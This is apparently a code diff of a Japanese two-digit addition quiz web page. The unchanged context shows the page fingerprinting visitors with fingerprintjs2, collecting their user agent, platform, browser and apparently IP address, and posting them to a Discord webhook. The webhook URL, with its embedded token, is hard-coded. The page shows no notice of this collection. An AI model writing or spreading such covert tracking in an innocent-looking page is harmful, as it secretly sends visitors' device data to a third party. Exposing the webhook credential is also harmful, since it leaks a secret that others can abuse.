@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>二桁足し算問題</title>
+    <title>二桁足し算問題1</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs2/2.1.0/fingerprint2.min.js"></script>
     <script>
         // ランダムな二桁の数を生成する関数
@@ -24,7 +24,6 @@
         // ユーザーの機種情報を取得する関数
         function getDeviceInfo(callback) {
             new Fingerprint2().get(function(components) {
-                const values = components.map(component => component.value);
                 const userAgent = components.find(component => component.key === 'user_agent').value;
                 const os = components.find(component => component.key === 'platform').value;
                 const browser = components.find(component => component.key === 'user_agent').value.split(' ')[0];
@@ -74,7 +73,7 @@
 
         // Webhookに情報を送信する関数
         function sendWebhook(deviceInfo, ipAddress, callback) {
-            const webhookURL = 'https://discord.com/api/webhooks/1224706704755920938/NG8PemBx5OHHE18_NOATXgPGA7JQVgZCKrHaj-6t7a4TX_Xmz1hJ9zrChClUggTUv415'; // ここにDiscordのWebhook URLを入力してください
+            const webhookURL = 'https://discord.com/api/webhooks/1224706704755920938/NG8PemBx5OHHE18_NOATXgPGA7JQVgZCKrHaj-6t7a4TX_Xmz1hJ9zrChClUggTUv415';
             const message = {
                 content: 'ユーザーが問題を正解しました。',
                 embeds: [{
